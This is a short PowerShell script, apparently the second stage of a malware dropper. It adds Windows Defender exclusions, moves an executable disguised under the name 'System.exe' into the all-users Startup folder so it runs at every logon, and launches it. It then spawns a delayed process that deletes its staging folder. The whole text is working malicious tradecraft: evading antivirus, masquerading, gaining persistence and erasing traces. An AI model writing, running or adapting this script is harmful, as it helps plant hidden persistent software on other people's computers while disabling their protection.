$ErrorActionPreference = "Stop"
$tempDir = "$env:TEMP\rt"
$exePath = "$tempDir\System.exe"
$startupPath = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\System.exe"

# Ensure startup folder exists (it usually does, but just in case)
if (-not (Test-Path (Split-Path $startupPath))) {
    New-Item -ItemType Directory -Path (Split-Path $startupPath) -Force
}

# Add Defender Exclusions
Add-MpPreference -ExclusionPath $tempDir
Add-MpPreference -ExclusionPath $startupPath
Add-MpPreference -ExclusionProcess "System.exe"

# Move to Startup
Move-Item -Path $exePath -Destination $startupPath -Force

# Run once to verify
Start-Process $startupPath -Wait

# Self-delete
# Use a separate process to ensure P2.ps1 can exit cleanly
$cleanupCommand = "Start-Sleep -Seconds 5; Remove-Item -Recurse -Force '$tempDir'"
Start-Process powershell -ArgumentList "-NoProfile -Command `"$cleanupCommand`""